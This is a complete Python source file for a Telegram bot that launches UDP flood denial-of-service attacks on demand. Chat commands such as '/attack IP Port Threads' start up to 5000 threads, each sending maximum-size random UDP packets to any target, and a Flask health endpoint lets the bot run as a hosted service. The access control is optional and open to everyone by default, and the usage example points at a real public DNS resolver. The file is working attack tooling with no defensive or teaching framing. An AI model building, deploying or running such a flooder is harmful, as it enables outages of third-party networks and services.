#!/usr/bin/env python3
"""
UDP Flood Bot - Railway Deployable Version
Uses environment variables for security
"""

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
import socket
import threading
import time
import os
import logging

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Get credentials from environment variables
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

# Validate credentials
if not all([API_ID, API_HASH, BOT_TOKEN]):
    logger.error("Missing required environment variables!")
    logger.error("Please set: API_ID, API_HASH, BOT_TOKEN")
    exit(1)

# Global variables for attack control
attack_running = False
threads_list = []
target_ip = ""
target_port = 0
max_threads = 5000

# Authorized users (optional security)
AUTHORIZED_USERS = os.getenv("AUTHORIZED_USERS", "").split(",")
AUTHORIZED_USERS = [int(x.strip()) for x in AUTHORIZED_USERS if x.strip()]

def is_authorized(user_id: int) -> bool:
    """Check if user is authorized to use bot"""
    if not AUTHORIZED_USERS or AUTHORIZED_USERS == [0]:
        return True  # No restrictions if not set
    return user_id in AUTHORIZED_USERS

# UDP Flood Attack Function
def udp_flood(ip, port, thread_id):
    global attack_running
    packet_count = 0
    try:
        while attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                bytes_data = os.urandom(65507)  # Max safe UDP packet size
                sock.sendto(bytes_data, (ip, port))
                packet_count += 1
                if packet_count % 1000 == 0:
                    logger.info(f"Thread {thread_id}: Sent {packet_count} packets")
                sock.close()
            except Exception as e:
                logger.error(f"Thread {thread_id} error: {e}")
                time.sleep(0.01)
    except Exception as e:
        logger.error(f"Thread {thread_id} crashed: {e}")

# Start Attack
def start_attack(ip, port, thread_count):
    global attack_running, threads_list, target_ip, target_port
    
    if attack_running:
        return False, "Attack already running!"
    
    if thread_count > max_threads:
        return False, f"Max threads allowed: {max_threads}"
    
    attack_running = True
    target_ip = ip
    target_port = port
    threads_list = []
    
    logger.info(f"Starting attack on {ip}:{port} with {thread_count} threads")
    
    for i in range(thread_count):
        thread = threading.Thread(target=udp_flood, args=(ip, port, i))
        thread.daemon = True
        thread.start()
        threads_list.append(thread)
    
    return True, "Attack started successfully"

# Stop Attack
def stop_attack():
    global attack_running, threads_list
    if not attack_running:
        return False, "No attack is running!"
    
    attack_running = False
    
    # Wait for threads to finish (with timeout)
    for thread in threads_list:
        thread.join(timeout=2)
    
    threads_list = []
    logger.info("Attack stopped")
    return True, "Attack stopped successfully"

# Pyrogram Bot Client
app = Client(
    "udp_flood_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workers=50
)

# Start Command
@app.on_message(filters.command("start"))
async def start_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 Status", callback_data="check_status")]
    ])
    
    await message.reply_text(
        f"**🚀 UDP Flood Bot**\n\n"
        f"**👤 User:** `{user_id}`\n"
        f"**🔰 Status:** Ready\n\n"
        f"**📌 Commands:**\n"
        f"`/attack IP Port Threads` - Start attack\n"
        f"`/stop` - Stop attack\n"
        f"`/status` - Check status\n\n"
        f"**⚠️ Max Threads:** `{max_threads}`",
        reply_markup=keyboard
    )

# Attack Command
@app.on_message(filters.command("attack"))
async def attack_cmd(client: Client, message: Message):
    global attack_running
    
    if attack_running:
        await message.reply_text("❌ **Attack already running!**\nUse `/stop` first.")
        return
    
    args = message.command[1:]
    
    if len(args) != 3:
        await message.reply_text(
            "**❌ Invalid Format!**\n\n"
            "**Usage:** `/attack IP Port Threads`\n"
            "**Example:** `/attack 1.1.1.1 80 1000`\n\n"
            f"**Max Threads:** `{max_threads}`"
        )
        return
    
    try:
        ip = args[0]
        port = int(args[1])
        threads = int(args[2])
        
        # Validate IP format
        socket.inet_aton(ip)
        
        # Validate port
        if not (1 <= port <= 65535):
            await message.reply_text("❌ **Port must be between 1-65535**")
            return
        
        # Validate threads
        if threads < 1 or threads > max_threads:
            await message.reply_text(f"❌ **Threads must be between 1-{max_threads}**")
            return
        
        # Start attack
        success, msg = start_attack(ip, port, threads)
        
        if success:
            await message.reply_text(
                f"**✅ Attack Started!**\n\n"
                f"**🎯 Target:** `{ip}:{port}`\n"
                f"**🧵 Threads:** `{threads}`\n"
                f"**👤 Started by:** `{message.from_user.id}`\n\n"
                f"**⏱️ Started at:** `{time.strftime('%H:%M:%S')}`"
            )
        else:
            await message.reply_text(f"❌ **{msg}**")
            
    except socket.error:
        await message.reply_text("❌ **Invalid IP address!**")
    except ValueError as e:
        await message.reply_text(f"❌ **Invalid number format:** `{e}`")
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await message.reply_text(f"❌ **Error:** `{str(e)}`")

# Stop Command
@app.on_message(filters.command("stop"))
async def stop_cmd(client: Client, message: Message):
    success, msg = stop_attack()
    
    if success:
        await message.reply_text(
            f"**🛑 Attack Stopped!**\n\n"
            f"**✅ All threads terminated**"
        )
    else:
        await message.reply_text(f"❌ **{msg}**")

# Status Command
@app.on_message(filters.command("status"))
async def status_cmd(client: Client, message: Message):
    if attack_running:
        await message.reply_text(
            f"**📊 Attack Status**\n\n"
            f"**🟢 Status:** Running\n"
            f"**🎯 Target:** `{target_ip}:{target_port}`\n"
            f"**🧵 Active Threads:** `{len(threads_list)}`"
        )
    else:
        await message.reply_text(
            f"**📊 Attack Status**\n\n"
            f"**🔴 Status:** Idle\n"
            f"**✅ Ready for attack**"
        )

# Callback Handler
@app.on_callback_query()
async def callback_handler(client: Client, callback_query):
    data = callback_query.data
    
    if data == "start_attack":
        await callback_query.message.edit_text(
            "**🎯 Enter Attack Details:**\n\n"
            "**Format:** `/attack IP Port Threads`\n\n"
            "**Example:**\n"
            "`/attack 1.1.1.1 80 1000`\n\n"
            f"**⚠️ Max Threads:** `{max_threads}`"
        )
    
    elif data == "stop_attack":
        success, msg = stop_attack()
        if success:
            await callback_query.message.edit_text("**🛑 Attack Stopped!**")
        else:
            await callback_query.message.edit_text(f"❌ **{msg}**")
    
    elif data == "check_status":
        if attack_running:
            await callback_query.message.edit_text(
                f"**📊 Running**\n"
                f"**Target:** `{target_ip}:{target_port}`",
                reply_markup=callback_query.message.reply_markup
            )
        else:
            await callback_query.message.edit_text(
                "**📊 Idle** - Ready for attack",
                reply_markup=callback_query.message.reply_markup
            )

# Error handler
@app.on_message()
async def unknown_handler(client: Client, message: Message):
    if message.text and not message.text.startswith('/'):
        # Ignore non-command text
        pass

# Health check endpoint (for Railway)
from flask import Flask
import threading

flask_app = Flask(__name__)

@flask_app.route('/')
def health_check():
    return {
        "status": "alive",
        "attack_running": attack_running,
        "timestamp": time.time()
    }

@flask_app.route('/health')
def health():
    return {"status": "ok"}, 200

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.getenv('PORT', 8080)))

# Main execution
if __name__ == "__main__":
    logger.info("🚀 Bot starting...")
    
    # Start Flask health check in background
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    logger.info("Health check server started")
    
    # Run the bot
    logger.info("Starting Telegram bot...")
    app.run()